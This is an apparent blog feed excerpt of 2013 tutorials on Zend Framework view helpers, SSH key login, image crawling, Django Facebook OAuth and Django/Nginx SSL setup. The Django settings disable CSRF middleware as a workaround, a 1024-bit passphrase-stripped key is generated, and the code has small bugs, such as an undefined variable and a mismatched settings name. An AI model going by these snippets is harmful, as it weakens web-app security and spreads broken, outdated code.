class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Module</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getViewHelperConfig</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;godHelper&#x27;</span> =&gt; <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$helper_plugin_manager</span></span>) </span>&#123;</span><br><span class="line">                <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Application\View\Helper\God</span>();</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$helper</span>;</span><br><span class="line">            &#125;,</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>godHelper</code> is an alias to be used in your view.</p><p>Now you’re done, you can use in any view now. i.e.</p><p><strong>./module/Application/view/application/index/foo.phtml</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">whatever</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span> $<span class="title">this</span>-&gt;<span class="title">godHelper</span>()-&gt;<span class="title">debug</span>($<span class="title">this</span>-&gt;<span class="title">form</span>-&gt;<span class="title">get</span>(&#x27;<span class="title">foo</span>&#x27;), 1); ?&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>You can now add as many functions as you want to the <code>God</code> class.</p><p><em>Reference: <a href="http://zf2dev.com/2013/03/19/how-to-write-custom-view-helper-in-zend-framework-2/">How to write custom view helper in Zend Framework 2 ?</a></em></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;For many situations, we need some helper functions to be used in view.&lt;/p&gt;
&lt;p&gt;i.e. When you want to debug, probably you will</summary>
        
      
    
    
    
    
    <category term="php" scheme="http://jslim.net/tags/php/"/>
    
    <category term="programming" scheme="http://jslim.net/tags/programming/"/>
    
    <category term="zend" scheme="http://jslim.net/tags/zend/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu server allow login via ssh with key</title>
    <link href="http://jslim.net/blog/2013/04/08/ubuntu-server-allow-login-via-ssh-with-key/"/>
    <id>http://jslim.net/blog/2013/04/08/ubuntu-server-allow-login-via-ssh-with-key/</id>
    <published>2013-04-08T09:47:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>The environment:</p><ul><li>Ubuntu server 12.04 LTS is running on VMWare Fusion with IP address 192.168.1.101 as <strong>Host</strong></li><li>Mac OS X Mountain Lion as <strong>Client</strong></li></ul><h3 id="In-your-ubuntu-server"><a href="#In-your-ubuntu-server" class="headerlink" title="In your ubuntu server"></a>In your ubuntu server</h3><p>Install ssh server</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-<span class="keyword">get</span> install openssh-<span class="keyword">server</span></span><br></pre></td></tr></table></figure><h3 id="In-OS-X"><a href="#In-OS-X" class="headerlink" title="In OS X"></a>In OS X</h3><p>Generate a key-pair</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir ~/.ssh</span><br><span class="line">$ chmod <span class="number">700</span> ~/.ssh</span><br><span class="line">$ ssh-keygen -t rsa</span><br><span class="line"></span><br><span class="line">Generating <span class="keyword">public</span>/<span class="keyword">private</span> rsa key pair.</span><br><span class="line">Enter <span class="keyword">file</span> in which to save the key (<span class="regexp">/home/</span>b<span class="regexp">/.ssh/i</span>d_rsa):</span><br><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase):</span><br><span class="line">Enter same passphrase again:</span><br><span class="line">Your identification has been saved in <span class="regexp">/home/</span>b<span class="regexp">/.ssh/i</span>d_rsa.</span><br><span class="line">Your <span class="keyword">public</span> key has been saved in <span class="regexp">/home/</span>b<span class="regexp">/.ssh/i</span>d_rsa.pub.</span><br></pre></td></tr></table></figure><p>Copy the public key <strong>id_rsa.pub</strong> to Ubuntu server</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>scp ~<span class="regexp">/.ssh/id</span>_rsa.pub user<span class="variable">@192</span>.<span class="number">168.1</span>.<span class="number">101</span><span class="symbol">:/home/user/</span>.ssh/authorized_keys</span><br></pre></td></tr></table></figure><p>If everything OK, now you can access via SSH without password</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>ssh user<span class="variable">@192</span>.<span class="number">168.1</span>.<span class="number">101</span></span><br></pre></td></tr></table></figure><p>Enjoy :)</p><p>Reference: <a href="https://help.ubuntu.com/community/SSH/OpenSSH/Keys">SSH/OpenSSH/Keys</a></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;The environment:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Ubuntu server 12.04 LTS is running on VMWare Fusion with IP address 192.168.1.101 as</summary>
        
      
    
    
    
    
    <category term="linux" scheme="http://jslim.net/tags/linux/"/>
    
    <category term="setup-configuration" scheme="http://jslim.net/tags/setup-configuration/"/>
    
  </entry>
  
  <entry>
    <title>Crawling images from a webpage</title>
    <link href="http://jslim.net/blog/2013/04/08/crawling-images-from-a-webpage/"/>
    <id>http://jslim.net/blog/2013/04/08/crawling-images-from-a-webpage/</id>
    <published>2013-04-08T07:26:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>First extract the url of images<br><strong>craw.py</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib2, re</span><br><span class="line">req = urllib2.Request(<span class="string">&#x27;http://yourwebsite.com/path/to/webpage&#x27;</span>)</span><br><span class="line">website = urllib2.urlopen(req)</span><br><span class="line"></span><br><span class="line">html = website.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Read all png files</span></span><br><span class="line">imgs = re.findall(<span class="string">&#x27;&quot;((http)s?://.*?.png)&quot;&#x27;</span>, text)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> imgs:</span><br><span class="line">    <span class="built_in">print</span> i[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>Then output the URLs to a text file</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">python</span> craw.<span class="keyword">py</span> &gt; content.txt</span><br></pre></td></tr></table></figure><p>Use shell script to download it<br><strong>craw.sh</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">file=<span class="string">&quot;./content.txt&quot;</span></span><br><span class="line"><span class="keyword">while</span> IFS= <span class="built_in">read</span> -r line</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    wget <span class="string">&quot;<span class="variable">$line</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span> &lt;<span class="string">&quot;<span class="variable">$file</span>&quot;</span></span><br></pre></td></tr></table></figure><p>You’re done!</p><p><em>References:</em></p><ul><li><em><a href="http://www.cyberciti.biz/faq/unix-howto-read-line-by-line-from-file/">UNIX: Read a File Line By Line</a></em></li><li><em><a href="http://kianmeng.org/blog/2013/03/11/extract-hyperlinks-using-python-and-php/">Extract Hyperlinks Using Python and PHP</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;First extract the url of images&lt;br&gt;&lt;strong&gt;craw.py&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight py&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span</summary>
        
      
    
    
    
    
    <category term="shell-script" scheme="http://jslim.net/tags/shell-script/"/>
    
    <category term="python" scheme="http://jslim.net/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Django - Redirect URL to facebook oAuth</title>
    <link href="http://jslim.net/blog/2013/04/05/django-redirect-url-to-facebook-oauth/"/>
    <id>http://jslim.net/blog/2013/04/05/django-redirect-url-to-facebook-oauth/</id>
    <published>2013-04-05T04:11:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>In your <strong>views.py</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="keyword">from</span> projectname <span class="keyword">import</span> settings</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> urlencode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;client_id&#x27;</span>: settings.FACEBOOK_APP_ID,</span><br><span class="line">        <span class="string">&#x27;redirect_uri&#x27;</span>: <span class="string">&#x27;https://www.facebook.com/yourappname/app_&#x27;</span> + settings.FACEBOOK_APP_ID,</span><br><span class="line">        <span class="string">&#x27;scope&#x27;</span>: <span class="string">&#x27;email,user_birthday,offline_access,publish_stream&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    redirect_url = <span class="string">&#x27;https://www.facebook.com/dialog/oauth/?&#x27;</span> + urlencode(params)</span><br><span class="line">    redirect_code = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;script type=&quot;text/javascript&quot;&gt;</span></span><br><span class="line"><span class="string">        top.location.href = &#x27;%s&#x27;;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span> % redirect_url;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(redirect_code, mimetype=<span class="string">&#x27;text/html&#x27;</span>)</span><br></pre></td></tr></table></figure><p>Make sure you add Facebook details to <strong>projectname/settings.py</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">FACEBOOK_APP_ID = <span class="string">&#x27;12332358235&#x27;</span></span><br><span class="line">FACEBOOK_APP_SECRET = <span class="string">&#x27;2839fsd9fh29hg897eyr8g&#x27;</span></span><br></pre></td></tr></table></figure><p>One more thing, be sure in your facebook app setting <strong>Website with Facebook Login</strong> set to your app URL</p><p><img src="/images/posts/2013-04-05-django-redirect-url-to-facebook-oauth/facebook-login-setting.png" alt="facebook setting"></p><p>Hurray! You’ve done</p><p><em>References:</em></p><ul><li><em><a href="http://stackoverflow.com/questions/5730545/how-to-redirect-the-url-after-logging-into-facebook#answers">How to redirect the url after logging into Facebook?</a></em></li><li><em><a href="https://developers.facebook.com/docs/reference/dialogs/oauth/">OAuth Dialog</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;In your &lt;strong&gt;views.py&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight py&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span</summary>
        
      
    
    
    
    
    <category term="python" scheme="http://jslim.net/tags/python/"/>
    
    <category term="django" scheme="http://jslim.net/tags/django/"/>
    
  </entry>
  
  <entry>
    <title>Python: Make a GET request to get JSON data</title>
    <link href="http://jslim.net/blog/2013/04/04/python-make-a-get-request-to-get-json-data/"/>
    <id>http://jslim.net/blog/2013/04/04/python-make-a-get-request-to-get-json-data/</id>
    <published>2013-04-04T08:04:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>Make a HTTP request to get JSON content from website.</p><p>Create a file <strong>json_helper.py</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_json_by_user_id</span>(<span class="params">user_id</span>):</span><br><span class="line">    header = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,&#125;</span><br><span class="line">    req = urllib2.Request(<span class="string">&#x27;http://www.example.com/getmyjson?user_id=&#x27;</span> + user_id)</span><br><span class="line">    website = urllib2.urlopen(req)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> json.loads(website.read())</span><br></pre></td></tr></table></figure><p>Usage:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> json_helper <span class="keyword">import</span> get_json_by_user_id</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> get_json_by_user_id(<span class="number">123</span>)</span><br></pre></td></tr></table></figure><p><em>Reference: <a href="http://kianmeng.org/blog/2013/03/11/extract-hyperlinks-using-python-and-php/">Extract Hyperlinks Using Python and PHP</a></em></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Make a HTTP request to get JSON content from website.&lt;/p&gt;
&lt;p&gt;Create a file &lt;strong&gt;json_helper.py&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight</summary>
        
      
    
    
    
    
    <category term="python" scheme="http://jslim.net/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Create Facebook page app using Django with Nginx</title>
    <link href="http://jslim.net/blog/2013/04/01/create-facebook-page-app-using-django-with-nginx/"/>
    <id>http://jslim.net/blog/2013/04/01/create-facebook-page-app-using-django-with-nginx/</id>
    <published>2013-04-01T13:31:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>This is continue from <a href="/blog/2013/03/29/setup-django-slash-mysql-in-ubuntu-server-in-vmware-fusion/">previous post</a>.</p><h2 id="Enable-SSL"><a href="#Enable-SSL" class="headerlink" title="Enable SSL"></a>Enable SSL</h2><p>As we know that Facebook app required SSL, so first we must self-sign a certificate</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Generate a private key</span></span><br><span class="line"><span class="variable">$ </span>openssl genrsa -des3 -<span class="keyword">out</span> server.key <span class="number">1024</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate a CSR (Certificate Signing Request)</span></span><br><span class="line"><span class="variable">$ </span>openssl req -new -key server.key -<span class="keyword">out</span> server.csr</span><br><span class="line"></span><br><span class="line"><span class="comment"># Remove Passphrase from key</span></span><br><span class="line"><span class="variable">$ </span>cp server.key server.key.orig</span><br><span class="line"><span class="variable">$ </span>openssl rsa -in server.key.orig -<span class="keyword">out</span> server.key</span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate a self-signed certificate</span></span><br><span class="line"><span class="variable">$ </span>openssl x509 -req -days <span class="number">365</span> -in server.csr -signkey server.key -<span class="keyword">out</span> server.crt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Keep the key and cert to a directory</span></span><br><span class="line"><span class="variable">$ </span>sudo mv server.key /etc/ssl/<span class="keyword">private</span>/yoursite.com.key</span><br><span class="line"><span class="variable">$ </span>sudo mv server.crt /etc/ssl/certs/yoursite.com.crt</span><br></pre></td></tr></table></figure><p>Configure Nginx - Edit <strong>/etc/nginx/sites-available/django.conf</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen <span class="number">80</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="comment"># Add here</span></span><br><span class="line">server &#123;</span><br><span class="line">    listen <span class="number">443</span>;</span><br><span class="line">    ssl on;</span><br><span class="line">    ssl_certificate <span class="regexp">/etc/</span>ssl<span class="regexp">/certs/y</span>oursite.com.crt</span><br><span class="line">    ssl_certificate_key <span class="regexp">/etc/</span>ssl<span class="regexp">/private/y</span>oursite.com.key</span><br><span class="line"></span><br><span class="line">    server_name https:<span class="regexp">//</span>test.local.domain;</span><br><span class="line">    access_log <span class="regexp">/home/u</span>sername<span class="regexp">/public_html/</span>projectname<span class="regexp">/logs/</span>access.log;</span><br><span class="line">    error_log <span class="regexp">/home/u</span>sername<span class="regexp">/public_html/</span>projectname<span class="regexp">/logs/</span>error.log;</span><br><span class="line"></span><br><span class="line">    location <span class="regexp">/static/</span> &#123;</span><br><span class="line">        alias <span class="regexp">/home/u</span>sername<span class="regexp">/public_html/</span>projectname<span class="regexp">/static/</span>;</span><br><span class="line">        expires <span class="number">30</span>d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location <span class="regexp">/media/</span> &#123;</span><br><span class="line">        alias <span class="regexp">/home/u</span>sername<span class="regexp">/public_html/</span>projectname<span class="regexp">/media/</span>;</span><br><span class="line">        expires <span class="number">30</span>d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        fastcgi_pass <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">8000</span>;</span><br><span class="line">        fastcgi_split_path_info ^()(.*)$;</span><br><span class="line">        include <span class="regexp">/etc/</span>nginx/fastcgi_params;</span><br><span class="line">        fastcgi_param PATH_INFO <span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">        fastcgi_pass_header Authorization;</span><br><span class="line">        fastcgi_intercept_errors off;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This basically listen to 1 more port, otherwise if you access via <strong>https</strong> will not found.</p><p>Add those path that you want it to use <strong>https</strong><br>Add a file in <strong>/home/username/public_html/projectname/middleware.py</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponsePermanentRedirect</span><br><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SecureRequiredMiddleware</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.paths = <span class="built_in">getattr</span>(settings, <span class="string">&#x27;SECURE_REQUIRED_PATHS&#x27;</span>)</span><br><span class="line">        self.enabled = self.paths <span class="keyword">and</span> <span class="built_in">getattr</span>(settings, <span class="string">&#x27;HTTPS_SUPPORT&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_request</span>(<span class="params">self, request</span>):</span><br><span class="line">        <span class="keyword">if</span> self.enabled <span class="keyword">and</span> <span class="keyword">not</span> request.is_secure():</span><br><span class="line">            <span class="keyword">for</span> path <span class="keyword">in</span> self.paths:</span><br><span class="line">                <span class="keyword">if</span> request.get_full_path().startswith(path):</span><br><span class="line">                    request_url = request.build_absolute_uri(request.get_full_path())</span><br><span class="line">                    secure_url = request_url.replace(<span class="string">&#x27;http://&#x27;</span>, <span class="string">&#x27;https://&#x27;</span>)</span><br><span class="line">                    <span class="keyword">return</span> HttpResponsePermanentRedirect(secure_url)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><p>In <strong>/home/username/public_html/projectname/projectname/settings.py</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">MIDDLEWARE_CLASSES = (</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># the line below if not comment out, 403 error will occur and I still haven&#x27;t figure it out</span></span><br><span class="line">    <span class="comment"># &#x27;django.middleware.csrf.CsrfViewMiddleware&#x27;,</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="string">&#x27;middleware.SecureRequiredMiddleware&#x27;</span>,</span><br><span class="line">)</span><br><span class="line">...</span><br><span class="line"><span class="comment"># HTTPS MIDDLEWARE CONFIG</span></span><br><span class="line">HTTPS_SUPPORT = <span class="literal">True</span></span><br><span class="line">SECURE_REQUIRE_PATHS = (</span><br><span class="line">    <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/admin/&#x27;</span>,</span><br><span class="line">    <span class="comment"># you can add in more path here if you want the path to use https</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="Create-home-view"><a href="#Create-home-view" class="headerlink" title="Create home view"></a>Create home view</h2><p>Edit <strong>/home/username/public_html/projectname/newapp/views.py</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.template.loader <span class="keyword">import</span> get_template</span><br><span class="line"><span class="keyword">from</span> django.template <span class="keyword">import</span> Context</span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    now = datetime.datetime.now()</span><br><span class="line">    t = get_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">    <span class="comment"># pass a dynamic value to the view</span></span><br><span class="line">    html = t.render(Context(&#123;<span class="string">&#x27;special_date&#x27;</span>: now&#125;))</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(html)</span><br></pre></td></tr></table></figure><p>In <strong>/home/username/public_html/projectname/newapp/urls.py</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> patterns, url</span><br><span class="line"><span class="keyword">from</span> newapp <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = patterns(<span class="string">&#x27;newapp&#x27;</span>,</span><br><span class="line">    url(<span class="string">r&#x27;^$&#x27;</span>, views.index)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>In <strong>/home/username/public_html/projectname/projectname/urls.py</strong>, this is the main URL setting<br>which will load the URLs in <strong>newapp</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">urlpatterns = patterns(<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    (<span class="string">r&#x27;^$&#x27;</span>, include(<span class="string">&#x27;newapp.urls&#x27;</span>)),</span><br><span class="line">    ...</span><br><span class="line">)</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="Create-a-template-for-home-page"><a href="#Create-a-template-for-home-page" class="headerlink" title="Create a template for home page"></a>Create a template for home page</h3><p>First, add the template dir to <strong>/home/username/public_html/projectname/projectname/settings.py</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line">...</span><br><span class="line">TEMPLATE_DIRS = (</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># in case that it is run on windows, so have to change to forward slash no matter how</span></span><br><span class="line">    os.path.join(os.path.dirname(__file__), <span class="string">&#x27;newapp/templates&#x27;</span>.replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)),</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>Create a directory to keep all templates related to <strong>newapp</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir <span class="regexp">/home/u</span>sername<span class="regexp">/public_html/</span>projectname<span class="regexp">/newapp/</span>templates</span><br><span class="line">$ touch <span class="regexp">/home/u</span>sername<span class="regexp">/public_html/</span>projectname<span class="regexp">/newapp/</span>templates/index.html</span><br></pre></td></tr></table></figure><p>In case that you want to keep your <strong>css</strong> or <strong>js</strong> or <strong>image</strong> files, so create a directory for them</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir <span class="regexp">/home/u</span>sername<span class="regexp">/public_html/</span>projectname/static</span><br><span class="line">$ mkdir <span class="regexp">/home/u</span>sername<span class="regexp">/public_html/</span>projectname<span class="regexp">/static/</span>css</span><br><span class="line">$ mkdir <span class="regexp">/home/u</span>sername<span class="regexp">/public_html/</span>projectname<span class="regexp">/static/</span>js</span><br><span class="line">$ mkdir <span class="regexp">/home/u</span>sername<span class="regexp">/public_html/</span>projectname<span class="regexp">/static/im</span>ages</span><br><span class="line"></span><br><span class="line"><span class="comment"># Add a stylesheet</span></span><br><span class="line">$ touch <span class="regexp">/home/u</span>sername<span class="regexp">/public_html/</span>projectname<span class="regexp">/static/</span>css/styles.css</span><br></pre></td></tr></table></figure><p>In <strong>/home/username/public_html/projectname/projectname/settings.py</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">STATIC_URL = <span class="string">&#x27;/static/&#x27;</span></span><br><span class="line">...</span><br><span class="line">STATICFILES_DIRS = (</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># just keep all static file here</span></span><br><span class="line">    <span class="string">&#x27;/home/username/public_html/projectname/static&#x27;</span>,</span><br><span 